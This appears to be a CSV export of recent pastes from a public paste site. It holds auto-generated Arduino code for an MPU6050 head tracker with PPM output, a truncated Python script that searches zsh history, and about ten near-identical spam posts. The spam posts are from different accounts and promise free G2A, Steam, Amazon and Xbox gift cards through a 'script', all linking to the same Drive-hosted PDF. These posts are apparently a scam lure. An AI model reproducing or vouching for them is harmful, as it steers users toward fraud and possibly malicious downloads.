id,title,username,language,date,content
Pu6GbnJZ,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Alfonso1119,JavaScript,Friday 21st of June 2024 01:04:31 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
June 17 2024

"
xwhQzrc6,"""MPU6050 PPM Encoder"" rev_04",pleasedontcode,Arduino,Friday 21st of June 2024 01:02:54 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""MPU6050 PPM Encoder""
	- Source Code compiled for: Arduino Mega
	- Source Code created on: 2024-06-21 06:00:23

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create a head tracking system with MPU6050 */
	/* gyroscope (I2C: SDA D20, SCL D21, Interrupt D2) */
	/* and PPMEncoder library. Ensure accurate data */
	/* capture and encoding for real-time head movement */
	/* tracking. Send out data in ppm format. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* calibrate gyro all center on start. all ppm */
	/* channel should be in center on start. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MPU6050_6Axis_MotionApps20.h>  // Include the correct MPU6050 library with DMP support
#include ""PPMEncoder.h""  // Include the PPMEncoder library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void dmpDataReady(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t gyro_MPU6050_Interrupt_PIN_D2 = 2;

/***** DEFINITION OF I2C PINS *****/
const uint8_t gyro_MPU6050_I2C_PIN_SDA_D20 = 20;
const uint8_t gyro_MPU6050_I2C_PIN_SCL_D21 = 21;
const uint8_t gyro_MPU6050_I2C_SLAVE_ADDRESS = 0x68;  // Correct I2C address for MPU6050

/***** DEFINITION OF PPM ENCODER PIN *****/
const uint8_t ppmEncoderOutputPin = 10;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
MPU6050 mpu;  // Define the MPU6050 object

/****** GLOBAL VARIABLES *****/
bool dmpReady = false;  // Set true if DMP init was successful
uint8_t mpuIntStatus;   // Holds actual interrupt status byte from MPU
uint8_t devStatus;      // Return status after each device operation (0 = success, !0 = error)
uint16_t packetSize;    // Expected DMP packet size (default is 42 bytes)
uint16_t fifoCount;     // Count of all bytes currently in FIFO
uint8_t fifoBuffer[64]; // FIFO storage buffer

// Orientation/motion vars
Quaternion q;           // [w, x, y, z]         quaternion container
VectorFloat gravity;    // [x, y, z]            gravity vector
float ypr[3];           // [yaw, pitch, roll]   yaw/pitch/roll container and gravity vector

volatile bool mpuInterrupt = false;  // Indicates whether MPU interrupt pin has gone high

void dmpDataReady() {
    mpuInterrupt = true;
}

void setup(void) {
    // Initialize PPM Encoder
    ppmEncoder.begin(ppmEncoderOutputPin);

    // Set all PPM channels to center on start
    for (int i = 0; i < PPM_DEFAULT_CHANNELS; i++) {
        ppmEncoder.setChannel(i, (PPMEncoder::MIN + PPMEncoder::MAX) / 2);
    }

    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);

    // Initialize I2C
    Wire.begin();
    Wire.setClock(400000);  // 400kHz I2C clock. Comment this line if having compilation difficulties

    // Initialize serial communication
    Serial.begin(115200);
    while (!Serial);  // Wait for Leonardo enumeration, others continue immediately

    // Initialize the MPU6050
    Serial.println(F(""Initializing I2C devices...""));
    mpu.initialize();
    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);

    // Verify connection
    Serial.println(F(""Testing device connections...""));
    Serial.println(mpu.testConnection() ? F(""MPU6050 connection successful"") : F(""MPU6050 connection failed""));

    // Wait for ready
    Serial.println(F(""\nSend any character to begin DMP programming and demo: ""));
    while (!Serial.available());
    while (Serial.available() && Serial.read());  // Empty buffer

    // Load and configure the DMP
    Serial.println(F(""Initializing DMP...""));
    devStatus = mpu.dmpInitialize();

    // Supply your own gyro offsets here, scaled for min sensitivity
    mpu.setXGyroOffset(220);
    mpu.setYGyroOffset(76);
    mpu.setZGyroOffset(-85);
    mpu.setZAccelOffset(1788);  // 1688 factory default for my test chip

    // Make sure it worked (returns 0 if so)
    if (devStatus == 0) {
        // Calibration Time: generate offsets and calibrate our MPU6050
        mpu.CalibrateAccel(6);
        mpu.CalibrateGyro(6);
        mpu.PrintActiveOffsets();
        Serial.println(F(""Enabling DMP...""));
        mpu.setDMPEnabled(true);

        // Enable Arduino interrupt detection
        Serial.print(F(""Enabling interrupt detection (Arduino external interrupt ""));
        Serial.print(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2));
        Serial.println(F("")...""));
        attachInterrupt(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2), dmpDataReady, RISING);
        mpuIntStatus = mpu.getIntStatus();

        // Set our DMP ready flag so the main loop() function knows it's okay to use it
        Serial.println(F(""DMP ready! Waiting for first interrupt...""));
        dmpReady = true;

        // Get expected DMP packet size for later comparison
        packetSize = mpu.dmpGetFIFOPacketSize();
    } else {
        // ERROR!
        // 1 = initial memory load failed
        // 2 = DMP configuration updates failed
        // (if it's going to break, usually the code will be 1)
        Serial.print(F(""DMP Initialization failed (code ""));
        Serial.print(devStatus);
        Serial.println(F("")""));
    }
}

void loop(void) {
    // If programming failed, don't try to do anything
    if (!dmpReady) return;

    // Wait for MPU interrupt or extra packet(s) available
    while (!mpuInterrupt && fifoCount < packetSize) {
        // Do nothing
    }

    // Reset interrupt flag and get INT_STATUS byte
    mpuInterrupt = false;
    mpuIntStatus = mpu.getIntStatus();

    // Get current FIFO count
    fifoCount = mpu.getFIFOCount();

    // Check for overflow (this should never happen unless our code is too inefficient)
    if ((mpuIntStatus & 0x10) || fifoCount == 1024) {
        // Reset so we can continue cleanly
        mpu.resetFIFO();
        Serial.println(F(""FIFO overflow!""));

    // Otherwise, check for DMP data ready interrupt (this should happen frequently)
    } else if (mpuIntStatus & 0x02) {
        // Wait for correct available data length, should be a VERY short wait
        while (fifoCount < packetSize) fifoCount = mpu.getFIFOCount();

        // Read a packet from FIFO
        mpu.getFIFOBytes(fifoBuffer, packetSize);

        // Track FIFO count here in case there is > 1 packet available
        // (this lets us immediately read more without waiting for an interrupt)
        fifoCount -= packetSize;

        mpu.dmpGetQuaternion(&q, fifoBuffer);
        mpu.dmpGetGravity(&gravity, &q);
        mpu.dmpGetYawPitchRoll(ypr, &q, &gravity);
        Serial.print(""ypr\t"");
        Serial.print(ypr[0] * 180/M_PI);
        Serial.print(""\t"");
        Serial.print(ypr[1] * 180/M_PI);
        Serial.print(""\t"");
        Serial.println(ypr[2] * 180/M_PI);

        // Map the yaw, pitch, and roll to PPM channels
        ppmEncoder.setChannel(0, map(ypr[0] * 180/M_PI, -180, 180, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(1, map(ypr[1] * 180/M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(2, map(ypr[2] * 180/M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
    }
}

/* END CODE */"
698RDwhR,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Garoam,JavaScript,Friday 21st of June 2024 12:58:34 AM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
June 17th 2024

"
NHN174Sf,"""MPU6050 PPM"" rev_03",pleasedontcode,Arduino,Friday 21st of June 2024 12:57:53 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""MPU6050 PPM""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-21 05:55:47

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create a head tracking system with MPU6050 */
	/* gyroscope (I2C: SDA D20, SCL D21, Interrupt D2) */
	/* and PPMEncoder library. Ensure accurate data */
	/* capture and encoding for real-time head movement */
	/* tracking. Send out data in ppm format. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* calibrate gyro all center on start. all ppm */
	/* channel should be in center on start. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MPU6050_6Axis_MotionApps20.h>  // Include the correct MPU6050 library with DMP support
#include ""PPMEncoder.h""  // Include the PPMEncoder library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void dmpDataReady(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t gyro_MPU6050_Interrupt_PIN_D2 = 2;

/***** DEFINITION OF I2C PINS *****/
const uint8_t gyro_MPU6050_I2C_PIN_SDA_D20 = 20;
const uint8_t gyro_MPU6050_I2C_PIN_SCL_D21 = 21;
const uint8_t gyro_MPU6050_I2C_SLAVE_ADDRESS = 0x68;  // Correct I2C address for MPU6050

/***** DEFINITION OF PPM ENCODER PIN *****/
const uint8_t ppmEncoderOutputPin = 10;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
MPU6050 mpu;  // Define the MPU6050 object
PPMEncoder ppmEncoder;  // Define the PPMEncoder object

/****** GLOBAL VARIABLES *****/
bool dmpReady = false;  // Set true if DMP init was successful
uint8_t mpuIntStatus;   // Holds actual interrupt status byte from MPU
uint8_t devStatus;      // Return status after each device operation (0 = success, !0 = error)
uint16_t packetSize;    // Expected DMP packet size (default is 42 bytes)
uint16_t fifoCount;     // Count of all bytes currently in FIFO
uint8_t fifoBuffer[64]; // FIFO storage buffer

// Orientation/motion vars
Quaternion q;           // [w, x, y, z]         quaternion container
VectorFloat gravity;    // [x, y, z]            gravity vector
float ypr[3];           // [yaw, pitch, roll]   yaw/pitch/roll container and gravity vector

volatile bool mpuInterrupt = false;  // Indicates whether MPU interrupt pin has gone high

void dmpDataReady() {
    mpuInterrupt = true;
}

void setup(void) {
    // Initialize PPM Encoder
    ppmEncoder.begin(ppmEncoderOutputPin);

    // Set all PPM channels to center on start
    for (int i = 0; i < ppmEncoder.getChannelCount(); i++) {
        ppmEncoder.setChannel(i, PPMEncoder::CENTER);
    }

    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);

    // Initialize I2C
    Wire.begin();
    Wire.setClock(400000);  // 400kHz I2C clock. Comment this line if having compilation difficulties

    // Initialize serial communication
    Serial.begin(115200);
    while (!Serial);  // Wait for Leonardo enumeration, others continue immediately

    // Initialize the MPU6050
    Serial.println(F(""Initializing I2C devices...""));
    mpu.initialize();
    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);

    // Verify connection
    Serial.println(F(""Testing device connections...""));
    Serial.println(mpu.testConnection() ? F(""MPU6050 connection successful"") : F(""MPU6050 connection failed""));

    // Wait for ready
    Serial.println(F(""\nSend any character to begin DMP programming and demo: ""));
    while (!Serial.available());
    while (Serial.available() && Serial.read());  // Empty buffer

    // Load and configure the DMP
    Serial.println(F(""Initializing DMP...""));
    devStatus = mpu.dmpInitialize();

    // Supply your own gyro offsets here, scaled for min sensitivity
    mpu.setXGyroOffset(220);
    mpu.setYGyroOffset(76);
    mpu.setZGyroOffset(-85);
    mpu.setZAccelOffset(1788);  // 1688 factory default for my test chip

    // Make sure it worked (returns 0 if so)
    if (devStatus == 0) {
        // Calibration Time: generate offsets and calibrate our MPU6050
        mpu.CalibrateAccel(6);
        mpu.CalibrateGyro(6);
        mpu.PrintActiveOffsets();
        Serial.println(F(""Enabling DMP...""));
        mpu.setDMPEnabled(true);

        // Enable Arduino interrupt detection
        Serial.print(F(""Enabling interrupt detection (Arduino external interrupt ""));
        Serial.print(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2));
        Serial.println(F("")...""));
        attachInterrupt(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2), dmpDataReady, RISING);
        mpuIntStatus = mpu.getIntStatus();

        // Set our DMP ready flag so the main loop() function knows it's okay to use it
        Serial.println(F(""DMP ready! Waiting for first interrupt...""));
        dmpReady = true;

        // Get expected DMP packet size for later comparison
        packetSize = mpu.dmpGetFIFOPacketSize();
    } else {
        // ERROR!
        // 1 = initial memory load failed
        // 2 = DMP configuration updates failed
        // (if it's going to break, usually the code will be 1)
        Serial.print(F(""DMP Initialization failed (code ""));
        Serial.print(devStatus);
        Serial.println(F("")""));
    }
}

void loop(void) {
    // If programming failed, don't try to do anything
    if (!dmpReady) return;

    // Wait for MPU interrupt or extra packet(s) available
    while (!mpuInterrupt && fifoCount < packetSize) {
        // Do nothing
    }

    // Reset interrupt flag and get INT_STATUS byte
    mpuInterrupt = false;
    mpuIntStatus = mpu.getIntStatus();

    // Get current FIFO count
    fifoCount = mpu.getFIFOCount();

    // Check for overflow (this should never happen unless our code is too inefficient)
    if ((mpuIntStatus & 0x10) || fifoCount == 1024) {
        // Reset so we can continue cleanly
        mpu.resetFIFO();
        Serial.println(F(""FIFO overflow!""));

    // Otherwise, check for DMP data ready interrupt (this should happen frequently)
    } else if (mpuIntStatus & 0x02) {
        // Wait for correct available data length, should be a VERY short wait
        while (fifoCount < packetSize) fifoCount = mpu.getFIFOCount();

        // Read a packet from FIFO
        mpu.getFIFOBytes(fifoBuffer, packetSize);

        // Track FIFO count here in case there is > 1 packet available
        // (this lets us immediately read more without waiting for an interrupt)
        fifoCount -= packetSize;

        mpu.dmpGetQuaternion(&q, fifoBuffer);
        mpu.dmpGetGravity(&gravity, &q);
        mpu.dmpGetYawPitchRoll(ypr, &q, &gravity);
        Serial.print(""ypr\t"");
        Serial.print(ypr[0] * 180/M_PI);
        Serial.print(""\t"");
        Serial.print(ypr[1] * 180/M_PI);
        Serial.print(""\t"");
        Serial.println(ypr[2] * 180/M_PI);

        // Map the yaw, pitch, and roll to PPM channels
        ppmEncoder.setChannel(0, map(ypr[0] * 180/M_PI, -180, 180, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(1, map(ypr[1] * 180/M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(2, map(ypr[2] * 180/M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
    }
}

/* END CODE */"
YB3DPc3f,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,atakan1983,JavaScript,Friday 21st of June 2024 12:52:31 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
17th of June 2024

"
zZNXtHug,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,tajdiqul,JavaScript,Friday 21st of June 2024 12:46:31 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
17th of June 2024

"
f7PgkXkQ,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,notgoodatscripting,JavaScript,Friday 21st of June 2024 12:40:33 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
June 17th 2024

"
iwUZNJV7,"""MPU6050 Setup"" rev_02",pleasedontcode,Arduino,Friday 21st of June 2024 12:39:11 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""MPU6050 Setup""
	- Source Code compiled for: Arduino Mega
	- Source Code created on: 2024-06-21 05:38:13

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create a head tracking system with MPU6050 */
	/* gyroscope (I2C: SDA D20, SCL D21, Interrupt D2) */
	/* and PPMEncoder library. Ensure accurate data */
	/* capture and encoding for real-time head movement */
	/* tracking. Send out data in ppm format. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MPU6050_6Axis_MotionApps20.h>  //https://github.com/jrowberg/i2cdevlib
#include <PPMEncoder.h>  //https://github.com/schinken/PPMEncoder

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void dmpDataReady(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t gyro_MPU6050_Interrupt_PIN_D2 = 2;

/***** DEFINITION OF I2C PINS *****/
const uint8_t gyro_MPU6050_I2C_PIN_SDA_D20 = 20;
const uint8_t gyro_MPU6050_I2C_PIN_SCL_D21 = 21;
const uint8_t gyro_MPU6050_I2C_SLAVE_ADDRESS = 0x68;

/***** DEFINITION OF PPM OUTPUT PIN *****/
const uint8_t ppmOutputPin = 10;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
MPU6050 mpu;

/****** GLOBAL VARIABLES *****/
bool blinkState = false;
bool dmpReady = false;
uint8_t mpuIntStatus, devStatus, fifoBuffer[64];
uint16_t packetSize, fifoCount;
Quaternion q;
VectorFloat gravity;
float ypr[3];

volatile bool mpuInterrupt = false;

/****** FUNCTION DEFINITIONS *****/
void dmpDataReady() {
    mpuInterrupt = true;
}

void setup(void) {
    // put your setup code here, to run once:
    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);
    pinMode(LED_BUILTIN, OUTPUT);

    // Initialize I2C communication
    Wire.begin();
    Wire.setClock(400000);  // 400kHz I2C clock

    // Initialize serial communication
    Serial.begin(115200);
    while (!Serial);

    // Initialize MPU6050
    Serial.println(F(""Initializing I2C devices...""));
    mpu.initialize();
    Serial.println(F(""Testing device connections...""));
    Serial.println(mpu.testConnection() ? F(""MPU6050 connection successful"") : F(""MPU6050 connection failed""));

    // Wait for user input to start DMP
    Serial.println(F(""\nSend any character to begin DMP programming and demo: ""));
    while (!Serial.available());
    while (Serial.available() && Serial.read());

    // Initialize DMP
    Serial.println(F(""Initializing DMP...""));
    devStatus = mpu.dmpInitialize();

    // Supply your own gyro offsets here, scaled for min sensitivity
    mpu.setXGyroOffset(220);
    mpu.setYGyroOffset(76);
    mpu.setZGyroOffset(-85);
    mpu.setZAccelOffset(1788);

    // Check if DMP initialization was successful
    if (devStatus == 0) {
        mpu.CalibrateAccel(6);
        mpu.CalibrateGyro(6);
        mpu.PrintActiveOffsets();
        Serial.println(F(""Enabling DMP...""));
        mpu.setDMPEnabled(true);

        // Enable interrupt detection
        Serial.print(F(""Enabling interrupt detection (Arduino external interrupt ""));
        Serial.print(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2));
        Serial.println(F("")...""));
        attachInterrupt(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2), dmpDataReady, RISING);
        mpuIntStatus = mpu.getIntStatus();

        Serial.println(F(""DMP ready! Waiting for first interrupt...""));
        dmpReady = true;
        packetSize = mpu.dmpGetFIFOPacketSize();
    } else {
        Serial.print(F(""DMP Initialization failed (code ""));
        Serial.print(devStatus);
        Serial.println(F("")""));
    }

    // Initialize PPM Encoder
    ppmEncoder.begin(ppmOutputPin);
}

void loop(void) {
    // put your main code here, to run repeatedly:
    if (!dmpReady) return;

    // Check if there's a new DMP packet available
    if (mpu.dmpGetCurrentFIFOPacket(fifoBuffer)) {
        mpu.dmpGetQuaternion(&q, fifoBuffer);
        mpu.dmpGetGravity(&gravity, &q);
        mpu.dmpGetYawPitchRoll(ypr, &q, &gravity);
        Serial.print(""ypr\t"");
        Serial.print(ypr[0] * 180 / M_PI);
        Serial.print(""\t"");
        Serial.print(ypr[1] * 180 / M_PI);
        Serial.print(""\t"");
        Serial.println(ypr[2] * 180 / M_PI);

        // Encode Yaw, Pitch, and Roll into PPM channels
        ppmEncoder.setChannel(0, map(ypr[0] * 180 / M_PI, -180, 180, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(1, map(ypr[1] * 180 / M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(2, map(ypr[2] * 180 / M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));

        blinkState = !blinkState;
        digitalWrite(LED_BUILTIN, blinkState);
    }
}

/* END CODE */"
zSzYZ2yt,"""PPM Encoding"" rev_01",pleasedontcode,Arduino,Friday 21st of June 2024 12:36:54 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""PPM Encoding""
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2024-06-21 05:34:07

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Create a head tracking system with MPU6050 */
	/* gyroscope (I2C: SDA D20, SCL D21, Interrupt D2) */
	/* and PPMEncoder library. Ensure accurate data */
	/* capture and encoding for real-time head movement */
	/* tracking. Send out data in ppm format. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MPU6050_6Axis_MotionApps20.h>  //https://github.com/jrowberg/i2cdevlib
#include <PPMEncoder.h>  //https://github.com/your-PPMEncoder-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void dmpDataReady(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t gyro_MPU6050_Interrupt_PIN_D2 = 2;

/***** DEFINITION OF I2C PINS *****/
const uint8_t gyro_MPU6050_I2C_PIN_SDA_D20 = 20;
const uint8_t gyro_MPU6050_I2C_PIN_SCL_D21 = 21;
const uint8_t gyro_MPU6050_I2C_SLAVE_ADDRESS = 0x68;

/***** DEFINITION OF PPM OUTPUT PIN *****/
const uint8_t ppmOutputPin = 10;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
MPU6050 mpu;
PPMEncoder ppmEncoder;

/****** GLOBAL VARIABLES *****/
bool blinkState = false;
bool dmpReady = false;
uint8_t mpuIntStatus, devStatus, fifoBuffer[64];
uint16_t packetSize, fifoCount;
Quaternion q;
VectorFloat gravity;
float ypr[3];

volatile bool mpuInterrupt = false;

/****** FUNCTION DEFINITIONS *****/
void dmpDataReady() {
    mpuInterrupt = true;
}

void setup(void) {
    // put your setup code here, to run once:
    pinMode(gyro_MPU6050_Interrupt_PIN_D2, INPUT);
    pinMode(LED_BUILTIN, OUTPUT);

    // Initialize I2C communication
    Wire.begin();
    Wire.setClock(400000);  // 400kHz I2C clock

    // Initialize serial communication
    Serial.begin(115200);
    while (!Serial);

    // Initialize MPU6050
    Serial.println(F(""Initializing I2C devices...""));
    mpu.initialize();
    Serial.println(F(""Testing device connections...""));
    Serial.println(mpu.testConnection() ? F(""MPU6050 connection successful"") : F(""MPU6050 connection failed""));

    // Wait for user input to start DMP
    Serial.println(F(""\nSend any character to begin DMP programming and demo: ""));
    while (!Serial.available());
    while (Serial.available() && Serial.read());

    // Initialize DMP
    Serial.println(F(""Initializing DMP...""));
    devStatus = mpu.dmpInitialize();

    // Supply your own gyro offsets here, scaled for min sensitivity
    mpu.setXGyroOffset(220);
    mpu.setYGyroOffset(76);
    mpu.setZGyroOffset(-85);
    mpu.setZAccelOffset(1788);

    // Check if DMP initialization was successful
    if (devStatus == 0) {
        mpu.CalibrateAccel(6);
        mpu.CalibrateGyro(6);
        mpu.PrintActiveOffsets();
        Serial.println(F(""Enabling DMP...""));
        mpu.setDMPEnabled(true);

        // Enable interrupt detection
        Serial.print(F(""Enabling interrupt detection (Arduino external interrupt ""));
        Serial.print(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2));
        Serial.println(F("")...""));
        attachInterrupt(digitalPinToInterrupt(gyro_MPU6050_Interrupt_PIN_D2), dmpDataReady, RISING);
        mpuIntStatus = mpu.getIntStatus();

        Serial.println(F(""DMP ready! Waiting for first interrupt...""));
        dmpReady = true;
        packetSize = mpu.dmpGetFIFOPacketSize();
    } else {
        Serial.print(F(""DMP Initialization failed (code ""));
        Serial.print(devStatus);
        Serial.println(F("")""));
    }

    // Initialize PPM Encoder
    ppmEncoder.begin(ppmOutputPin);
}

void loop(void) {
    // put your main code here, to run repeatedly:
    if (!dmpReady) return;

    // Check if there's a new DMP packet available
    if (mpu.dmpGetCurrentFIFOPacket(fifoBuffer)) {
        mpu.dmpGetQuaternion(&q, fifoBuffer);
        mpu.dmpGetGravity(&gravity, &q);
        mpu.dmpGetYawPitchRoll(ypr, &q, &gravity);
        Serial.print(""ypr\t"");
        Serial.print(ypr[0] * 180 / M_PI);
        Serial.print(""\t"");
        Serial.print(ypr[1] * 180 / M_PI);
        Serial.print(""\t"");
        Serial.println(ypr[2] * 180 / M_PI);

        // Encode Yaw, Pitch, and Roll into PPM channels
        ppmEncoder.setChannel(0, map(ypr[0] * 180 / M_PI, -180, 180, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(1, map(ypr[1] * 180 / M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));
        ppmEncoder.setChannel(2, map(ypr[2] * 180 / M_PI, -90, 90, PPMEncoder::MIN, PPMEncoder::MAX));

        blinkState = !blinkState;
        digitalWrite(LED_BUILTIN, blinkState);
    }
}

/* END CODE */"
c0j1wSXF,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,bgill55,JavaScript,Friday 21st of June 2024 12:34:35 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
17th of June 2024

"
hikWhBEk,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,FreeRobux12345,JavaScript,Friday 21st of June 2024 12:28:35 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
17th of June 2024

"
8DZcVNWv,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,mikyser,JavaScript,Friday 21st of June 2024 12:22:34 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
17th of June 2024

"
42CF79Nh,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Ohtaku,JavaScript,Friday 21st of June 2024 12:16:34 AM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
June 17 2024

"
JZxbRHwB,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Elii,JavaScript,Friday 21st of June 2024 12:10:32 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1oScJEHt6q28O32jChlklUQU6fKtmP1mn/view?11648

Working as of:
June 17th 2024

"
34ZBRZ5J,remember,dyeske,Python,Thursday 20th of June 2024 11:52:00 PM CDT,"#!/usr/bin/env python
#
#
"""""" this searches history files """"""
from __future__ import print_function
import glob
import os
import re
import sys
import time
import optparse

#                           help='an integer for the accumulator')
#                                              help='sum the integers (default: find the max)')
# print(sys.version_info[0])
#        from importlib import abc


def main(ignore_case, quiet, query_list):
    """"""main routine""""""

    query_regex_list = []
    tmp = []

    for pattern in query_list:
        if ignore_case:
            query_regex_list.append(re.compile(pattern, re.IGNORECASE))
        else:
            query_regex_list.append(re.compile(pattern))

    for histfile in glob.glob(os.environ['HOME'] + '/.zsh/.zsh_history,*'):
        filestring = re.sub('^.zsh_history,(.*)', r'\1', os.path.split(histfile)[1])
        filestring = re.sub('^(.*).archive$', r'\1', filestring)

        if sys.version_info[0] == 3:
            history = open(histfile, 'r', encoding='ISO-8859-1')
        if sys.version_info[0] == 2:
            history = open(histfile, 'r')
        for line in history:
            # print (""%s %s"" % (histfile, line))
            match(""%s::%s"" % (line, filestring), tmp, query_regex_list)
        history.close()

